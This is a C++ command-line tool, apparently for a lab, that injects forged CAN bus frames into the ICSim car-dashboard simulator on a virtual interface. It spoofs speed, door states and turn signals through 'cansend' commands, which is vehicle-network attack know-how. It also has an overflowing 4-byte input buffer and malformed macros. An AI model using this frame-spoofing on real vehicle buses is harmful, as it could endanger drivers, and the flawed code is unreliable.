#include <iostream>
#include <stdlib.h>
#include <sstream>
#include <iomanip>
#include <unistd.h>
//defining macros
#define CID_DOORS 0x19b
#define CID_SIGNAL 0x188
#define CID_SPEED 0x244

#define MAX_SPEED = 0x0000003894
#define LEFT_SIGNAL = 0x01000000
#define RIGHT_SIGNAL = 0x02000000
#define ALERT_SIGNAL = 0x03000000

//declaring globals
uintptr_t bf_doors = 0b0000; //bitfield for storing door state
bool running = true; //used for the main loop

//displayed on startup
void InitScreen() {
	printf("ICSim exploitation tool\n"
		"type help for a list of commands\n");
}

//lists available functions
//should operate based on a list if developed further
void HelpScreen() {
	printf("Commands:\n"
		"help - displays list of commands\n"
		"doors - manage doors\n"
		"speed - set speed\n"
		"signal - send turn or alert signal\n"
		);
}

//calls a system function based on user input
void ExecSysCall(const char* sysCall) {
	system(sysCall);
}

//continously sends payload in a seperate thread
void SpeedThread(std::ostringstream& payload) {

	while(true) {
		system(payload.str().c_str());
	}
}

//forges the packet to be sent on the CAN bus
void ForgePacket(int canID, unsigned int payload) {

	std::ostringstream sysCommand;

	switch(canID) {
	case CID_SPEED:
	//(1667147035.257603) vcan0 244#0000000189
	//SpeedThread halts main loop, fix later with threading
		sysCommand << "cansend vcan0 " << std::hex << CID_SPEED <<
		"#" << std::uppercase << std::hex << std::setw(10) << std::setfill('0') << payload;
		SpeedThread(sysCommand);
		break;
	case CID_DOORS:
	//(1667150936.183231) vcan0 19B#00000F000000
	//ugly but will do for now
		sysCommand << "cansend vcan0 " << std::uppercase << std::hex << CID_DOORS << 
		"#00000" << std::uppercase << std::hex << payload << "000000";
		 system(sysCommand.str().c_str());
		break;
	case CID_SIGNAL:
	//(1667146248.669984) vcan0 188#03000000
	//sends the signal 5 times
	//ugly as well but does the trick
		{
		sysCommand << "cansend vcan0 " << std::uppercase << std::hex << CID_SIGNAL <<
		"#0" << std::uppercase << std::hex << payload << "000000";
		for(int i = 0; i < 4; i++) {
			system(sysCommand.str().c_str());
			usleep(2000000);
		}
		break;
	}
	default:
		//should never happen
		printf("Can ID not found\n");
		break;
	}
}

//sets speed
void SetSpeed() {

	uintptr_t payload;

	printf("Enter speed\n"
		"unit: km/h\n");
	std::cin >> payload;
	payload *= 100; //ICSim uses 2 decimal places, stored as an int

	ForgePacket(CID_SPEED, payload);

	return;
}

//weighs speed (100mph at 0,8 will be displayed as 80)
//it probably needs a mitm or else the display fluctuates
void WeighSpeed(double weight) {

}

//sends a turn or alert signal
void TurnSignal() {

	uintptr_t payload;

	printf("Enter signal\n"
		"1-left 2-right 3-alert\n");
	std::cin >> payload;

	ForgePacket(CID_SIGNAL, payload);

	return;
}

//manages door states based on a bitfield
void ManageDoors() {

	char payloadIn[4];
	char *endptr;
	int payload;

	printf("12 | Enter payload\n"
		"34 | 1-open 0-closed, example: 1100 \n");
	std::cin >> payloadIn;

	//converts binary input to int
	payload = (int)strtol(payloadIn, &endptr, 2);

	ForgePacket(CID_DOORS, payload);

	return;
}

//calls a function based on user input
void ExecCommand(std::string command) {
	//turns out theres no better way to switch over strings in c++
	if(command == "help"){HelpScreen();}
	else if(command == "doors"){ManageDoors();}
	else if(command == "speed"){SetSpeed();}
	else if(command == "signal"){TurnSignal();}
		else{printf("Command not found\n");}
}

int main() {
	std::string inputCommand;

	InitScreen();

	while(running){
		std::cin >> inputCommand;
		ExecCommand(inputCommand);
	}

	return 0;
}	